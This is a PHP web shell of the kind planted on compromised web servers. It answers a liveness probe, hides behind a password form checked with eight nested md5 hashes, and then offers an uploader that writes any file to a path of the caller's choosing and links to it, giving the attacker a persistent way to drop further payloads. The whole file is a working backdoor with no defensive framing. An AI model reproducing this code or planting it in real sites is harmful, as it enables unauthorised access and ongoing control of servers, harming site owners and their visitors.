<?php ?><?php if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) {
  session_start();
  if (!isset($_SESSION['secretyt'])) {
    $_SESSION['secretyt'] = false;
  }
  if (!$_SESSION['secretyt']) {
    if (isset($_POST['pwdyt']) && md5(md5(md5(md5(md5(md5(md5(md5($_POST['pwdyt'])))))))) == '2dec0af1d2efe0804b3b28bb0efa51c3') {
      $_SESSION['secretyt'] = true;
    } else {
$bytesecform = <<<FORM
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
    <style type="text/css">
      body {padding:10px}
      input {
        padding: 2px;
        display:inline-block;
        margin-right: 5px;
      }
    </style>
  </head>
  <body>
    <form action="" method="post" accept-charset="utf-8">
      <input type="password" name="pwdyt" value="" placeholder="passwd">
      <input type="submit" name="submit" value="submit">
    </form>
  </body>
</html>
FORM;
      die($bytesecform);
    }
  }
}
?>
<?php
echo('kill_the_net');
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>